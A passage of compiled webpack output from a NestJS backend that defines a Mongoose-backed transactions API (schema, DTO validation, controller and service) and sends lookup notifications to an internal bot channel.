    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TimestampSchema = exports.Timestamp = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __importDefault(__webpack_require__(/*! mongoose */ "mongoose"));
let Timestamp = class Timestamp {
};
exports.Timestamp = Timestamp;
exports.Timestamp = Timestamp = __decorate([
    (0, mongoose_1.Schema)({
        versionKey: false,
        autoIndex: true,
        strict: false,
        timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], Timestamp);
exports.TimestampSchema = mongoose_1.SchemaFactory.createForClass(Timestamp);
exports.TimestampSchema.add({ type: mongoose_2.default.Schema.Types.Mixed });


/***/ }),

/***/ "./src/components/transactions/dto/create-transaction.dto.ts":
/*!*******************************************************************!*\
  !*** ./src/components/transactions/dto/create-transaction.dto.ts ***!
  \*******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateTransactionDto = exports.TransactionStatus = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
var TransactionStatus;
(function (TransactionStatus) {
    TransactionStatus["PENDING"] = "pending";
    TransactionStatus["COMPLETED"] = "completed";
    TransactionStatus["FAILED"] = "failed";
    TransactionStatus["CANCELLED"] = "cancelled";
})(TransactionStatus || (exports.TransactionStatus = TransactionStatus = {}));
class CreateTransactionDto {
    constructor() {
        this.profile = "undefined";
        this.chatId = "undefined";
        this.ip = "undefined";
        this.status = TransactionStatus.PENDING;
    }
}
exports.CreateTransactionDto = CreateTransactionDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Unique transaction ID (UTR)',
        example: 'TXN123456789',
        minLength: 8
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    (0, class_validator_1.MinLength)(8),
    (0, class_transformer_1.Transform)(({ value }) => typeof value === 'string' ? value.toLowerCase() : value),
    __metadata("design:type", String)
], CreateTransactionDto.prototype, "transactionId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Amount involved in the transaction',
        example: 100.50,
        minimum: 0
    }),
    (0, class_validator_1.IsNumber)(),
    (0, class_validator_1.Min)(0),
    (0, class_transformer_1.Transform)(({ value }) => parseFloat(value)),
    __metadata("design:type", Number)
], CreateTransactionDto.prototype, "amount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Issue type reported by the user',
        example: 'payment_failed'
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", String)
], CreateTransactionDto.prototype, "issue", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Description of issue reported by the user',
        example: 'Payment failed due to network error'
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", String)
], CreateTransactionDto.prototype, "description", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Refund method selected by the user',
        example: 'bank_transfer',
        required: false
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], CreateTransactionDto.prototype, "refundMethod", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'User profile ID',
        example: 'user123',
        required: false
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], CreateTransactionDto.prototype, "profile", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'User chat ID',
        example: 'chat123',
        required: false
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], CreateTransactionDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'IP address of the user',
        example: '192.168.1.1',
        required: false
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], CreateTransactionDto.prototype, "ip", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Transaction status',
        enum: TransactionStatus,
        default: TransactionStatus.PENDING,
        required: false
    }),
    (0, class_validator_1.IsEnum)(TransactionStatus),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], CreateTransactionDto.prototype, "status", void 0);


/***/ }),

/***/ "./src/components/transactions/dto/index.ts":
/*!**************************************************!*\
  !*** ./src/components/transactions/dto/index.ts ***!
  \**************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./create-transaction.dto */ "./src/components/transactions/dto/create-transaction.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./update-transaction.dto */ "./src/components/transactions/dto/update-transaction.dto.ts"), exports);


/***/ }),

/***/ "./src/components/transactions/dto/update-transaction.dto.ts":
/*!*******************************************************************!*\
  !*** ./src/components/transactions/dto/update-transaction.dto.ts ***!
  \*******************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateTransactionDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_transaction_dto_1 = __webpack_require__(/*! ./create-transaction.dto */ "./src/components/transactions/dto/create-transaction.dto.ts");
class UpdateTransactionDto extends (0, swagger_1.PartialType)(create_transaction_dto_1.CreateTransactionDto) {
}
exports.UpdateTransactionDto = UpdateTransactionDto;


/***/ }),

/***/ "./src/components/transactions/index.ts":
/*!**********************************************!*\
  !*** ./src/components/transactions/index.ts ***!
  \**********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./transaction.controller */ "./src/components/transactions/transaction.controller.ts"), exports);
__exportStar(__webpack_require__(/*! ./transaction.module */ "./src/components/transactions/transaction.module.ts"), exports);
__exportStar(__webpack_require__(/*! ./transaction.service */ "./src/components/transactions/transaction.service.ts"), exports);
__exportStar(__webpack_require__(/*! ./schemas/transaction.schema */ "./src/components/transactions/schemas/transaction.schema.ts"), exports);
__exportStar(__webpack_require__(/*! ./dto */ "./src/components/transactions/dto/index.ts"), exports);


/***/ }),

/***/ "./src/components/transactions/schemas/transaction.schema.ts":
/*!*******************************************************************!*\
  !*** ./src/components/transactions/schemas/transaction.schema.ts ***!
  \*******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TransactionSchema = exports.Transaction = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_transaction_dto_1 = __webpack_require__(/*! ../dto/create-transaction.dto */ "./src/components/transactions/dto/create-transaction.dto.ts");
let Transaction = class Transaction {
};
exports.Transaction = Transaction;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Unique transaction ID (UTR)' }),
    (0, mongoose_1.Prop)({
        type: mongoose_2.Schema.Types.String,
        required: true,
        unique: true,
        index: true
    }),
    __metadata("design:type", String)
], Transaction.prototype, "transactionId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Amount involved in the transaction' }),
    (0, mongoose_1.Prop)({
        type: mongoose_2.Schema.Types.Number,
        required: true,
        min: 0
    }),
    __metadata("design:type", Number)
], Transaction.prototype, "amount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Issue type reported by the user' }),
    (0, mongoose_1.Prop)({
        type: mongoose_2.Schema.Types.String,
        required: true,
        index: true
    }),
    __metadata("design:type", String)
], Transaction.prototype, "issue", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Description of issue reported by the user' }),
    (0, mongoose_1.Prop)({
        type: mongoose_2.Schema.Types.String,
        required: true
    }),
    __metadata("design:type", String)
], Transaction.prototype, "description", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Refund method selected by the user' }),
    (0, mongoose_1.Prop)({
        type: mongoose_2.Schema.Types.String,
        default: 'undefined',
        index: true
    }),
    __metadata("design:type", String)
], Transaction.prototype, "refundMethod", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'User profile ID' }),
    (0, mongoose_1.Prop)({
        type: mongoose_2.Schema.Types.String,
        default: 'undefined',
        index: true
    }),
    __metadata("design:type", String)
], Transaction.prototype, "profile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'User chat ID' }),
    (0, mongoose_1.Prop)({
        type: mongoose_2.Schema.Types.String,
        default: 'undefined',
        index: true
    }),
    __metadata("design:type", String)
], Transaction.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'IP address of the user' }),
    (0, mongoose_1.Prop)({
        type: mongoose_2.Schema.Types.String,
        default: 'undefined'
    }),
    __metadata("design:type", String)
], Transaction.prototype, "ip", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Transaction status',
        enum: create_transaction_dto_1.TransactionStatus,
        default: create_transaction_dto_1.TransactionStatus.PENDING
    }),
    (0, mongoose_1.Prop)({
        type: mongoose_2.Schema.Types.String,
        enum: Object.values(create_transaction_dto_1.TransactionStatus),
        default: create_transaction_dto_1.TransactionStatus.PENDING,
        index: true
    }),
    __metadata("design:type", String)
], Transaction.prototype, "status", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Creation timestamp' }),
    (0, mongoose_1.Prop)({ type: Date }),
    __metadata("design:type", Date)
], Transaction.prototype, "createdAt", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Last update timestamp' }),
    (0, mongoose_1.Prop)({ type: Date }),
    __metadata("design:type", Date)
], Transaction.prototype, "updatedAt", void 0);
exports.Transaction = Transaction = __decorate([
    (0, mongoose_1.Schema)({
        collection: 'transactions',
        versionKey: false,
        autoIndex: true,
        timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                ret['id'] = ret._id;
                delete ret._id;
                return ret;
            },
        }
    })
], Transaction);
exports.TransactionSchema = mongoose_1.SchemaFactory.createForClass(Transaction);


/***/ }),

/***/ "./src/components/transactions/transaction.controller.ts":
/*!***************************************************************!*\
  !*** ./src/components/transactions/transaction.controller.ts ***!
  \***************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TransactionController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_transaction_dto_1 = __webpack_require__(/*! ./dto/create-transaction.dto */ "./src/components/transactions/dto/create-transaction.dto.ts");
const update_transaction_dto_1 = __webpack_require__(/*! ./dto/update-transaction.dto */ "./src/components/transactions/dto/update-transaction.dto.ts");
const transaction_service_1 = __webpack_require__(/*! ./transaction.service */ "./src/components/transactions/transaction.service.ts");
const transaction_schema_1 = __webpack_require__(/*! ./schemas/transaction.schema */ "./src/components/transactions/schemas/transaction.schema.ts");
let TransactionController = class TransactionController {
    constructor(transactionService) {
        this.transactionService = transactionService;
    }
    async create(createTransactionDto) {
        return this.transactionService.create(createTransactionDto);
    }
    async findOne(id) {
        return this.transactionService.findOne(id);
    }
    async findAll(transactionId, amount, issue, refundMethod, profile, chatId, ip, status, limit, offset) {
        return this.transactionService.findAll({ transactionId, amount, issue, refundMethod, profile, chatId, status, ip }, limit, offset);
    }
    async update(id, updateTransactionDto) {
        return this.transactionService.update(id, updateTransactionDto);
    }
    async delete(id) {
        return this.transactionService.delete(id);
    }
};
exports.TransactionController = TransactionController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({
        summary: 'Create a new transaction',
        description: 'Creates a new transaction record with the provided details'
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.CREATED,
        description: 'Transaction created successfully.',
        type: transaction_schema_1.Transaction
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.BAD_REQUEST,
        description: 'Invalid input data provided.'
    }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_transaction_dto_1.CreateTransactionDto]),
    __metadata("design:returntype", Promise)
], TransactionController.prototype, "create", null);
__decorate([
    (0, common_1.Get)(':id'),
    (0, swagger_1.ApiOperation)({
        summary: 'Get transaction by ID',
        description: 'Retrieves a specific transaction by its unique identifier'
    }),
    (0, swagger_1.ApiParam)({
        name: 'id',
        description: 'Transaction unique identifier',
        required: true
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.OK,
        description: 'Transaction retrieved successfully.',
        type: transaction_schema_1.Transaction
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.NOT_FOUND,
        description: 'Transaction not found.'
    }),
    __param(0, (0, common_1.Param)('id')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TransactionController.prototype, "findOne", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({
        summary: 'Get all transactions',
        description: 'Retrieves all transactions with optional filtering, pagination and sorting'
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.OK,
        description: 'Transactions retrieved successfully.',
        type: [transaction_schema_1.Transaction]
    }),
    (0, swagger_1.ApiQuery)({ name: 'transactionId', required: false, description: 'Filter by transaction ID (UTR)' }),
    (0, swagger_1.ApiQuery)({ name: 'amount', required: false, type: 'number', description: 'Filter by transaction amount' }),
    (0, swagger_1.ApiQuery)({ name: 'issue', required: false, description: 'Filter by issue type' }),
    (0, swagger_1.ApiQuery)({ name: 'refundMethod', required: false, description: 'Filter by refund method' }),
    (0, swagger_1.ApiQuery)({ name: 'profile', required: false, description: 'Filter by user profile' }),
    (0, swagger_1.ApiQuery)({ name: 'chatId', required: false, description: 'Filter by chat ID' }),
    (0, swagger_1.ApiQuery)({ name: 'ip', required: false, description: 'Filter by IP address' }),
    (0, swagger_1.ApiQuery)({ name: 'status', required: false, description: 'Filter by transaction status' }),
    (0, swagger_1.ApiQuery)({ name: 'limit', required: false, type: 'number', description: 'Number of records to return', example: 10 }),
    (0, swagger_1.ApiQuery)({ name: 'offset', required: false, type: 'number', description: 'Number of records to skip', example: 0 }),
    __param(0, (0, common_1.Query)('transactionId')),
    __param(1, (0, common_1.Query)('amount')),
    __param(2, (0, common_1.Query)('issue')),
    __param(3, (0, common_1.Query)('refundMethod')),
    __param(4, (0, common_1.Query)('profile')),
    __param(5, (0, common_1.Query)('chatId')),
    __param(6, (0, common_1.Query)('ip')),
    __param(7, (0, common_1.Query)('status')),
    __param(8, (0, common_1.Query)('limit')),
    __param(9, (0, common_1.Query)('offset')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Number, String, String, String, String, String, String, Number, Number]),
    __metadata("design:returntype", Promise)
], TransactionController.prototype, "findAll", null);
__decorate([
    (0, common_1.Put)(':id'),
    (0, swagger_1.ApiOperation)({
        summary: 'Update a transaction',
        description: 'Updates an existing transaction by its unique identifier'
    }),
    (0, swagger_1.ApiParam)({
        name: 'id',
        description: 'Transaction unique identifier',
        required: true
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.OK,
        description: 'Transaction updated successfully.',
        type: transaction_schema_1.Transaction
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.NOT_FOUND,
        description: 'Transaction not found.'
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.BAD_REQUEST,
        description: 'Invalid input data provided.'
    }),
    __param(0, (0, common_1.Param)('id')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_transaction_dto_1.UpdateTransactionDto]),
    __metadata("design:returntype", Promise)
], TransactionController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':id'),
    (0, swagger_1.ApiOperation)({
        summary: 'Delete a transaction',
        description: 'Deletes a transaction by its unique identifier'
    }),
    (0, swagger_1.ApiParam)({
        name: 'id',
        description: 'Transaction unique identifier',
        required: true
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.OK,
        description: 'Transaction deleted successfully.',
        type: transaction_schema_1.Transaction
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.NOT_FOUND,
        description: 'Transaction not found.'
    }),
    __param(0, (0, common_1.Param)('id')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TransactionController.prototype, "delete", null);
exports.TransactionController = TransactionController = __decorate([
    (0, swagger_1.ApiTags)('Transactions'),
    (0, common_1.Controller)('transactions'),
    __metadata("design:paramtypes", [transaction_service_1.TransactionService])
], TransactionController);


/***/ }),

/***/ "./src/components/transactions/transaction.module.ts":
/*!***********************************************************!*\
  !*** ./src/components/transactions/transaction.module.ts ***!
  \***********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TransactionModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const transaction_service_1 = __webpack_require__(/*! ./transaction.service */ "./src/components/transactions/transaction.service.ts");
const transaction_controller_1 = __webpack_require__(/*! ./transaction.controller */ "./src/components/transactions/transaction.controller.ts");
const transaction_schema_1 = __webpack_require__(/*! ./schemas/transaction.schema */ "./src/components/transactions/schemas/transaction.schema.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
let TransactionModule = class TransactionModule {
};
exports.TransactionModule = TransactionModule;
exports.TransactionModule = TransactionModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            mongoose_1.MongooseModule.forFeature([
                { name: transaction_schema_1.Transaction.name, schema: transaction_schema_1.TransactionSchema },
            ]),
        ],
        controllers: [transaction_controller_1.TransactionController],
        providers: [transaction_service_1.TransactionService],
        exports: [transaction_service_1.TransactionService]
    })
], TransactionModule);


/***/ }),

/***/ "./src/components/transactions/transaction.service.ts":
/*!************************************************************!*\
  !*** ./src/components/transactions/transaction.service.ts ***!
  \************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var TransactionService_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TransactionService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const transaction_schema_1 = __webpack_require__(/*! ./schemas/transaction.schema */ "./src/components/transactions/schemas/transaction.schema.ts");
const fetchWithTimeout_1 = __webpack_require__(/*! ../../utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const logbots_1 = __webpack_require__(/*! ../../utils/logbots */ "./src/utils/logbots.ts");
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils/index.ts");
let TransactionService = TransactionService_1 = class TransactionService {
    constructor(transactionModel) {
        this.transactionModel = transactionModel;
        this.logger = new utils_1.Logger(TransactionService_1.name);
    }
    async create(createTransactionDto) {
        this.logger.log(`Creating new transaction: ${JSON.stringify(createTransactionDto)}`);
        try {
            const existingTransaction = await this.transactionModel
                .findOne({ transactionId: createTransactionDto.transactionId })
                .exec();
            if (existingTransaction) {
                throw new common_1.BadRequestException('Transaction with this ID already exists');
            }
            const newTransaction = new this.transactionModel(createTransactionDto);
            const savedTransaction = await newTransaction.save();
            this.logger.log(`Transaction created successfully: ${savedTransaction.transactionId}`);
            return savedTransaction;
        }
        catch (error) {
            this.logger.error(`Error creating transaction: ${error.message}`, error.stack);
            throw error instanceof common_1.BadRequestException ? error : new common_1.BadRequestException('Failed to create transaction');
        }
    }
    async findOne(id) {
        this.logger.debug(`Finding transaction by ID: ${id}`);
        try {
            const transaction = await this.transactionModel.findById(id).exec();
            if (!transaction) {
                this.logger.warn(`Transaction not found with ID: ${id}`);
                throw new common_1.NotFoundException('Transaction not found');
            }
            return transaction;
        }
        catch (error) {
            this.logger.error(`Error finding transaction: ${error.message}`, error.stack);
            if (error instanceof common_1.NotFoundException)
                throw error;
            throw new common_1.BadRequestException('Invalid transaction ID format');
        }
    }
    async findAll(filters, limit = 10, offset = 0) {
        this.logger.debug(`Finding transactions with filters: ${JSON.stringify(filters)}`);
        try {
            let query = {};
            let transactions = [];
            let total = 0;
            if (filters.transactionId) {
                const transactionIdQuery = {
                    $or: [
                        { transactionId: filters.transactionId.toLowerCase() }
                    ]
                };
                if ((0, mongoose_2.isValidObjectId)(filters.transactionId)) {
                    transactionIdQuery.$or.push({ _id: filters.transactionId });
                }
                [transactions, total] = await Promise.all([
                    this.transactionModel
                        .find(transactionIdQuery)
                        .sort({ createdAt: -1 })
                        .skip(offset)
                        .limit(limit)
                        .exec(),
                    this.transactionModel.countDocuments(transactionIdQuery).exec(),
                ]);
                if (total > 0) {
                    this.logger.debug(`Found ${total} transactions matching transactionId: ${filters.transactionId}`);
                    await this.sendNotification(filters, total);
                    return { transactions, total };
                }
            }
            if (filters.ip) {
                query = { ip: filters.ip };
                [transactions, total] = await Promise.all([
                    this.transactionModel
                        .find(query)
                        .sort({ createdAt: -1 })
                        .skip(offset)
                        .limit(limit)
                        .exec(),
                    this.transactionModel.countDocuments(query).exec(),
                ]);
                if (total > 0) {
                    this.logger.debug(`Found ${total} transactions matching ip: ${filters.ip}`);
                    await this.sendNotification(filters, total);
                    return { transactions, total };
                }
            }
            if (filters.chatId) {
                query = { chatId: filters.chatId };
                [transactions, total] = await Promise.all([
                    this.transactionModel
                        .find(query)
                        .sort({ createdAt: -1 })
                        .skip(offset)
                        .limit(limit)
                        .exec(),
                    this.transactionModel.countDocuments(query).exec(),
                ]);
                if (total > 0) {
                    this.logger.debug(`Found ${total} transactions matching chatId: ${filters.chatId}`);
                    await this.sendNotification(filters, total);
                    return { transactions, total };
                }
            }
            const remainingFilters = {};
            if (filters.profile)
                remainingFilters['profile'] = filters.profile;
            if (filters.amount)
                remainingFilters['amount'] = filters.amount;
            if (filters.issue)
                remainingFilters['issue'] = filters.issue;
            if (filters.refundMethod)
                remainingFilters['refundMethod'] = filters.refundMethod;
            if (filters.status)
                remainingFilters['status'] = filters.status;
            if (Object.keys(remainingFilters).length > 0) {
                query = remainingFilters;
                [transactions, total] = await Promise.all([
                    this.transactionModel
                        .find(query)
                        .sort({ createdAt: -1 })
                        .skip(offset)
                        .limit(limit)
                        .exec(),
                    this.transactionModel.countDocuments(query).exec(),
                ]);
            }
            this.logger.debug(`Found ${total} transactions matching remaining filters`);
            await this.sendNotification(filters, total);
            return { transactions, total };
        }
        catch (error) {
            this.logger.error(`Error finding transactions: ${error.message}`, error.stack);
            throw new common_1.BadRequestException('Failed to fetch transactions');
        }
    }
    async sendNotification(filters, total) {
        try {
            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)(process.env.accountsChannel)}&text=${encodeURIComponent(`Found ${total} transactions matching ip: ${filters.ip || 'N/A'}\nchatId: ${filters.chatId || 'N/A'}\ntransactionId: ${filters.transactionId || 'N/A'}\nprofile: ${filters.profile || 'N/A'}`)}`);
        }
        catch (error) {
            this.logger.error(`Failed to send notification: ${error.message}`);
        }
    }
    async update(id, updateTransactionDto) {
        this.logger.debug(`Updating transaction ${id} with data: ${JSON.stringify(updateTransactionDto)}`);
        try {
            const updatedTransaction = await this.transactionModel
                .findByIdAndUpdate(id, updateTransactionDto, {
                new: true,
                runValidators: true
            })
                .exec();
            if (!updatedTransaction) {
                this.logger.warn(`Transaction not found for update with ID: ${id}`);
                throw new common_1.NotFoundException('Transaction not found');
            }
            this.logger.log(`Transaction ${id} updated successfully`);
            return updatedTransaction;
        }
        catch (error) {
            this.logger.error(`Error updating transaction: ${error.message}`, error.stack);
            if (error instanceof common_1.NotFoundException)
                throw error;
            throw new common_1.BadRequestException('Failed to update transaction');
        }
    }
    async delete(id) {
        this.logger.debug(`Deleting transaction: ${id}`);
        try {
            const deletedTransaction = await this.transactionModel.findByIdAndDelete(id).exec();
            if (!deletedTransaction) {
                this.logger.warn(`Transaction not found for deletion with ID: ${id}`);
                throw new common_1.NotFoundException('Transaction not found');
            }
            this.logger.log(`Transaction ${id} deleted successfully`);
            return deletedTransaction;
        }
        catch (error) {
